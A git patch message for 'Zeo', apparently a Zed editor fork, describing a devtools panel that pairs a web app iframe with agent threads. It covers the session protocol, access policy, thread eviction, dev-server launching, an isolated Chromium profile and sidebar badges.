From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
From: lucascouts <lucascs@protonmail.com>
Date: Thu, 15 Oct 2026 22:45:00 -0300
Subject: [PATCH] devtools_panel: a browser devtools panel beside the app, on
 devtools threads of its own

Working on a web app with the agent meant three windows: the page, the agent
thread in Zeo, and the terminal running the dev server. zeo-devtools (the Vite
plugin of 0052) now serves a panel page on its own port: the app in an iframe
beside a chat bound to an agent thread in Zeo. This patch is Zeo's half. Zeo
stays the core: the panel works only while the project is open in Zeo, and every
thread it uses is an ordinary Zeo thread that can be opened and written to from
the editor.

Design decisions (story 055, design.md D1-D6):
- D1, no third protocol: the panel and the dev server are two more clients of
  0058's v2 session protocol on 0052's socket. ClientInfo becomes a union on
  `kind` -- extension (the default when `kind` is absent, so 045's fixtures and
  every installed extension still parse), dev_server {root, app_url,
  panel_url}, panel {root}. New client kind create_thread (panel only); new
  server kinds created {id, thread}, project_open, project_closed. A follow
  target is never offered to a panel: subscribe {follow} answers bad_request.
- D2/D3 (panel on another origin of the same site, SSE + POST) are the
  plugin's; nothing in Zeo depends on them.
- D4, the devtools mark is in memory until the first message: 0048's admit()
  refuses drafts, so the mark lives in agent_ui::devtools_threads and is written
  on promotion (the first ThreadMetadataStore save with a session id, observed
  with cx.observe, since save emits no event) to thread_organization.devtools_root,
  migration step 2 appended to ORGANIZATION_MIGRATIONS. An empty devtools thread
  does not survive a restart.
- D5, its own USE group: it needs 0058's session code, so it applies after
  browser-extension and before test, and the ebuild ties devtools-panel? to
  browser-extension. On by default.
- D6 (the panel UI moved from zeo-browser) is the plugin's.

What Zeo does:
- connected projects (agent_ui::devtools_projects): a dev-server hello registers
  root -> {app_url, panel_url}; a newer announce for a root ends the older one.
  Every accepted dev-server or panel hello gets welcome (echoing the hello id)
  and then the root's state, project_open or project_closed. The state is a
  cached snapshot of the open worktree roots with 0052's component-wise
  containment rule, refreshed on workspace added/removed, window open/close,
  worktree added/removed/paths changed and app quit; a change is pushed to the
  announce session and every panel session of the root. It is not computed with
  resolve_window_for_path_with, which answers AiDisabled before looking at
  windows, so AI disabled would read as a closed project.
- devtools threads (agent_ui::devtools_threads): create resolves the window by
  root, creates the thread with the root's worktrees as work dirs and answers
  created only once the connection is ready (30 s; load_error, auth_required, a
  released view and AI disabled answer agent_start_failed early). list gives
  this run's creations first, then earlier runs by created_at, at most 50;
  archived threads and orphan marks are not listed and not reachable.
  ensure_loaded opens a persisted thread through the new
  AgentPanel::load_thread_in_background -- load_agent_thread always replaces
  the panel's base view, which would yank the operator's thread away. The
  DevtoolsThreads global is built in agent_ui::init, at top level, so the
  thread list reads persisted marks from the first render.
- panel session policy (agent_ui::browser_channel): no approval prompt for a
  panel or dev-server session (the boundary is the same uid, as for 0052);
  list_threads, subscribe, send, cancel and authorize only for a devtools
  thread of the session's own root, else not_found with no detail -- "not
  yours" and "does not exist" are one answer, so a panel never sees an editor
  thread even by id. While the root is not open every request but hello
  answers project_closed. A dev-server session may only say hello. Revoke
  closes the extension's sessions only. Late answers are fenced by a per-root
  epoch: a create finishing after the session ended says nothing, after the
  root closed answers project_closed and keeps the thread. AI disabled answers
  ai_disabled to subscribe/send/authorize, as for the extension. Logs are
  key=value with root and thread id, never text. SESSION_PLACES 4 -> 8, so an
  announce, two panels and the extension fit.
- eviction: retention cleanup keeps a devtools view while it is still
  connecting (create or load began less than 30 s ago); a connected one
  follows max_idle_retained_threads like any other. When a panel's subscribed
  thread is evicted, Zeo reloads it through ensure_loaded, at most 3 times per
  (session, thread) in 30 s, then sends thread_closed; a subscribe while that
  budget is spent answers agent_start_failed without loading, so a loop of
  evict and reload cannot spin.
  An empty devtools thread that went away with its window answers not_found,
  even once the project is reopened -- reloading it would land in a window
  with no agent panel yet and answer agent_start_failed (no_agent_panel); the
  panel then drops the binding. A draft the idle cap released is remembered
  (at most 64) with the panel that released it, and while that panel is still
  in an open window it is reloaded from its metadata as before.
  list_threads applies the same test, so the panel never lists a thread
  that would answer not_found.
- `devtools: start` / `devtools: stop` (agent_ui::devtools_run): runs the
  project's dev script in a terminal task ("devtools: dev server"):
  devtools.dev_command when the worktree is trusted, else `<pm> run dev` with
  the package manager from packageManager or the lockfile. A second start
  focuses the running terminal. The server stops when the workspace or window
  that started it goes away and on quit, by closing the terminal explicitly
  rather than relying on its Drop. One 60 s announce deadline, owned here, is
  shared with the browser open below, so its message is shown once.
- `devtools: open in browser` (agent_ui::devtools_browser), with isolated and
  system variants (gpui action names cannot hold parentheses): creates a
  devtools thread and opens <panel_url>#thread=<id>. isolated starts chromium
  (or chromium-browser) from PATH with its own profile under Zeo's data
  directory, --app= and an optional --load-extension, detached in its own
  process group with LD_LIBRARY_PATH removed (an AppImage's mount would vanish
  under it); not found, or system, goes through cx.open_url. devtools.browser
  and devtools.browser_extension_path are read from the user settings file
  only, so a project file cannot choose the browser; dev_command is the one
  key a project may set, which is why the section lives in the project
  settings.
- thread list (sidebar, ui::ThreadItem): a ToolWeb badge (the globe Zed
  already ships; there is no IconName::Globe) on every devtools thread,
  unpromoted drafts included, and a "Devtools threads only" toggle in the
  search header -- this Zed has no filter menu -- composing with the text
  filter and 0049's pinned section.

It also extends 0065's drag guard (story 036) to the devtools-only view:
drop_thread_row and thread_row_drag test Sidebar::is_filtering instead of
the filter text alone, because that view shows only part of a project's
order, and a drop there would record only the visible threads and erase
the hidden ones' places. 0065's ThreadEntry test fixture gains is_devtools,
and sidebar_organization_filter_tests.rs gains the two devtools-only drop
tests and their helpers.

Since story 037 (2026-10-20) ThreadItem's badge builder, its rendering
and thread_item_badge_tests.rs come from 0068, which generalised them to
several badges, and so does the pub(crate) visibility of
thread_organization's test_helpers, capture_logs and all_lines_lowercased;
this patch keeps only its badge(IconName::ToolWeb, "Devtools thread")
call. sidebar_devtools_tests.rs gains a test that the devtools-only view
and 0068's #tag filter both hold, in groups and in the Pinned section.

Since story 038 (2026-10-20) 0069's Lists view builds its rows through
0049's build_pinned_rows too, so this patch also sets is_devtools in
that second PinnedBuildContext, in rebuild_contents' Lists hook: a
devtools thread filed in a list carries the same globe badge as in its
group.

USE devtools-panel (default on) needs browser-extension. Applies on top of 0058
with or without 0057; 0050/0051 apply on top of it unchanged.

Story 055 (zed/.epic/stories/055-devtools-panel-mvp), branch story/055.
